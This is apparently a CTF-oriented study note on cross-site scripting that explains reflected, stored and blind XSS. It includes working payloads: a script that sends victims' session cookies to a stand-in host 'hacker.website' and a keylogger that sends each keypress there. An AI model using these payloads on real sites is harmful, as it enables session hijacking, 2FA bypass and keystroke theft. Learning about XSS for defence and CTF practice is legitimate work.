# XSS and Javascript vulnerabilities

[![xssgi](../../../_badges/xssgi.svg)](https://tryhackme.com/room/xssgi)

<div class="row row-cols-md-2"><div>

Cross-site Scripting, most commonly called **XSS**, refer to injecting malicious JavaScript in a web application with the goal of it being executed by other users.

**The usual proof of concept**: show an alert if the script was executed.

```js
<script>alert('XSS');</script>
```

**Session hijacking**: anyone executing this script will send their cookie to a malicious website owned by the hacker used to capture cookies. The script is using `btoa()` to encode in base64 the values. Sessions cookies are gold 💰, because with them, we can simulate that we are logged, and bypass verifications such as 2FA.

```js
<script>fetch('https://hacker.website/steal?cookie=' + btoa(document.cookie));</script>
```
</div><div>

**A simple keylogger**: send each key pressed is sent to the hacker website. The script is using `btoa()` to encode in base64 the values.

```js
<script>document.onkeypress = function(e) { fetch('https://hacker.website/keylogger?key=' + btoa(e.key) )}</script>
```

<br>

**Exploit the client privileges**: when a client is logged, then can do things on the website. Sometimes, the website is using an API, and the malicious code may use the client identify to do API calls, such as resetting the password, or stuff like that.

> In CTF, or to test that in local, you can create a server with ncat `nc -nlvp port`, and use `fetch('http://ip:port?x=...')`.
</div></div>

<hr class="sl">

## Reflected XSS

<div class="row row-cols-md-2"><div>

The malicious code is usually inside a URL, and the vulnerable website when loading the URL, will execute the malicious website.
</div><div>

For instance, "https://vulnerable.search.engine" is a search engine in which the query is stored in the URL in the parameter `q`. The website is vulnerable to XSS, so if we open the URL, then the javascript will run in our browser.

```
https://vulnerable.search.engine/?q=%3Cscript%3Ealert(%27XSS%27)%3B%3C%2Fscript%3E
```
</div></div>

<hr class="sr">

## Stored XSS

<div class="row row-cols-md-2"><div>

The malicious code is stored by the website, usually in a database. Then, in another page loading the data from the database, a vulnerable website will execute the malicious code.

> Comments, profiles, listings... may be vulnerable.
</div><div>

For instance, a user using the value `<script>alert('XSS');</script>` as username. Then, for instance on the vulnerable profile page, any user opening a link to the compromised profile, will execute the malicious code.
</div></div>

<hr class="sl">

## DOM Based XSS

...

<hr class="sr">

## Blind XSS

<div class="row row-cols-md-2"><div>

In blind XSS, you are usually sending a payload in a contact/support... forms, in order to maybe steal information from the admin-side website if any. We are calling it "blind XSS", because it's not possible to see if it's working.
</div><div>

See [xsshunter](https://github.com/mandatoryprogrammer/xsshunter) (1.2k ⭐)
</div></div>